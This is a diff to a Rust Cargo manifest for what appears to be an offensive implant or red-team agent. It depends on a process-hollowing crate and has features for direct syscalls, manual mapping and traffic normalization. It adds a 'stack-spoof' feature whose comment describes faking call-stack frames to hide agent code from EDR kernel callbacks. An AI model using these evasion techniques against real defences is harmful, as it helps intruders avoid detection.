@@ -63,7 +63,7 @@ enigo = { version = "0.2", optional = true }
 enigo = { version = "0.2", optional = true }
 winreg = "0.52"
 image = { version = "0.25", optional = true }
-winapi = { version = "0.3", features = ["debugapi", "processthreadsapi", "memoryapi", "sysinfoapi", "winbase", "winnt", "libloaderapi", "winreg", "winnls", "wow64apiset", "handleapi", "iphlpapi", "iptypes", "fileapi", "synchapi", "minwinbase", "tlhelp32", "combaseapi", "objbase", "wingdi", "winuser"] }
+winapi = { version = "0.3", features = ["debugapi", "processthreadsapi", "memoryapi", "sysinfoapi", "winbase", "winnt", "libloaderapi", "winreg", "winnls", "wow64apiset", "handleapi", "iphlpapi", "iptypes", "fileapi", "synchapi", "minwinbase", "tlhelp32", "combaseapi", "objbase", "wingdi", "winuser", "oleauto", "oaidl", "objidl", "rpcdce", "rpcndr"] }
 hollowing = { path = "../hollowing" }
 
 [features]
@@ -81,6 +81,13 @@ network-discovery = []
 remote-assist = ["dep:enigo", "dep:image", "dep:x11cap"]
 module-signatures = ["common/module-signatures"]
 direct-syscalls = []
+# Spoof the user-mode call stack visible to EDR kernel callbacks during
+# indirect syscall dispatch.  Before jumping to the ntdll syscall gadget
+# a two-entry fake frame chain is pushed onto the stack so that stack walkers
+# see ntdll!NtQuerySystemTime as the immediate caller rather than agent code.
+# Requires (and implies) the `direct-syscalls` feature; only active on
+# Windows x86-64.
+stack-spoof = ["direct-syscalls"]
 manual-map = ["module_loader/manual-map"]
 traffic-normalization = []
 perf-optimize = []
